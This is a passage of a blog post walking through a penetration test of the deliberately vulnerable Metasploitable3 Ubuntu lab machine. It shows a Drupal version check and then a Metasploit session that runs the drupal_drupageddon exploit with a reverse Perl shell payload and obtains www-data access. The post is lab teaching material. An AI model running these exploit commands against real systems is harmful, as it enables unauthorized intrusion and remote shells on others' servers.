srcset=\"/static/cd90b16f93bc9a6a164533c632f13050/c26ae/drupal-directory-listing.png 158w,\n/static/cd90b16f93bc9a6a164533c632f13050/6bdcf/drupal-directory-listing.png 315w,\n/static/cd90b16f93bc9a6a164533c632f13050/f058b/drupal-directory-listing.png 630w,\n/static/cd90b16f93bc9a6a164533c632f13050/61c63/drupal-directory-listing.png 693w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Opening the file revealed the installed version of Drupal was 7.5.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/d0518aeeb932d04fafde79ce0030f8e0/d0cc0/drupal-version.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.835443037974684%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABM0lEQVQoz22S147CQAxF8/9fh0IoIYWSAoQkSCmQ8uDV8cqrgPbhyjO259rXY6dpGsmyTIqikPP5LNfrVW632x/yPBff9yWKIrnf7+ojBxBLkkRjYRhK13XipGkq2+1W9vu9bDYbuVwuSgw4n04n8TxPSXmMz0AOZLxbr9dSVZU4JLmuq4Q8pgCdPB4PRVmWeh+G4V+M4yjzPMs0TfJ6vX47XK1WWo22se/3+wMkfvuWMYDcvu/FoQNIbD7M5fl8atCSsN/ntm0V+CDGKiG66Qy54Hg8qlQbPoUowsz4OO5Y4pz51A9CZohkyPjtw+GgyVRnLsxoae289AOT71CNDiChW+uIUSAda59DLqjrWnPxY+1MEyoZmbYitjI2giAIdAMYy2630/Uhn3Wx/YzjWJVB+AOAJ6BPKEMndAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Drupal version\"\n        title=\"Drupal version\"\n        src=\"/static/d0518aeeb932d04fafde79ce0030f8e0/f058b/drupal-version.png\"\n        srcset=\"/static/d0518aeeb932d04fafde79ce0030f8e0/c26ae/drupal-version.png 158w,\n/static/d0518aeeb932d04fafde79ce0030f8e0/6bdcf/drupal-version.png 315w,\n/static/d0518aeeb932d04fafde79ce0030f8e0/f058b/drupal-version.png 630w,\n/static/d0518aeeb932d04fafde79ce0030f8e0/d0cc0/drupal-version.png 732w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>From here, I investigated some exploits and started testing them out against Metasploitable3.\nI was specifically selecting any exploits for version 7.5 but was having no luck. In the end, I discovered the <code class=\"language-text\">drupal_drupageddon</code> exploit which was successful against the Drupal install on Metasploitable3.</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">msf > use exploit/multi/http/drupal_drupageddon\n\nmsf exploit(multi/http/drupal_drupageddon) > set rhost 192.168.19.20\nrhost => 192.168.19.20\n\nmsf exploit(multi/http/drupal_drupageddon) > set targeturi /drupal/\ntargeturi => /drupal/\n\nmsf exploit(multi/http/drupal_drupageddon) > set payload php/reverse_perl \npayload => php/reverse_perl\n\nmsf exploit(multi/http/drupal_drupageddon) > exploit\n\n[*] Started reverse TCP handler on 192.168.19.10:4444 \n[*] Command shell session 6 opened (192.168.19.10:4444 -> 192.168.19.20:47667) at 2018-07-08 00:06:22 -0400</code></pre></div>\n<p>The <code class=\"language-text\">targeturi</code> was set to <code class=\"language-text\">/drupal/</code> instead of root (<code class=\"language-text\">/</code>) as the drupal install was in the <code class=\"language-text\">drupal</code> directory on the Apache web server. After the exploit ran I was, again, unsuccessful! The <code class=\"language-text\">whoami</code> command revealed I was… the <code class=\"language-text\">www-data</code> user. What was very interesting was that the <a href=\"https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon\">\nVulnerability &#x26; Exploit Database</a> stated the exploit only worked against Drupal 7.0 and 7.31 (was fixed in 7.32). The server apparently had version 7.5 and was still vulnerable. Anyway, no higher level of access was gained. </p>\n<h2 id=\"resources\" style=\"position:relative;\"><a href=\"#resources\" aria-label=\"resources permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Resources</h2>\n<p>While writing the post and investigating the Metasploitable3 Ubuntu Linux build I came across some very interesting articles written by participants of the Rapid7 Capture the Flag (CTF) competition. I have listed the articles below for reference:</p>\n<ul>\n<li><a href=\"https://github.com/16667/Metasploitable-3-CTF\">Metasploitable3 CTF Write-up by 16667</a></li>\n<li><a href=\"https://darkglade.com/2017/12/12/metasploitable3-community-ctf-walkthroughish/\">Metasploitable3 Community CTF – Walkthrough(ish) by DarkGlade</a></li>\n<li><a href=\"https://ratil.life/metasploitable3-ctf/\">Metasploitable3 CTF by Trevor Steen</a></li>\n</ul>\n<h2 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>Hopefully, this tutorial gave you some ideas and knowledge about vulnerabilities and exploits concerned with the Metasploitable3 Ubuntu Linux version. This post took a long time to test and document. I just couldn’t get enough of trying different exploit methods and wanted a thorough and well-documented post to share. Hope you enjoyed it, and please leave a comment if you have any information to share! I think there is one more post to come in this series, to finish off testing service exploits, and maybe a little on privilege escalation.</p>","frontmatter":{"title":"Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 2)","date":"July 09, 2018","tags":["Metasploitable3","Pentesting","Metasploit"],"description":"Walkthrough of Pentesting the Metasploitable3 Ubuntu Linux version using Metasploit.","thumbnail":"metasploitable3.png"}},"previous":{"fields":{"slug":"/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1/"},"frontmatter":{"title":"Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 1)"}},"next":{"fields":{"slug":"/blog/2018-07-10/mqtt-web-app-using-javascript-and-websockets/"},"frontmatter":{"title":"MQTT Web App using JavaScript and WebSockets"}}},"pageContext":{"id":"970a8eee-dcd0-514b-be8e-4e40e041b41f","previousPostId":"ff31b458-54da-5325-8181-9da709962911","nextPostId":"8f43812c-6881-5088-b5e6-cf0145e45c84"}},"staticQueryHashes":["1771194231","2841359383","3880320062"]}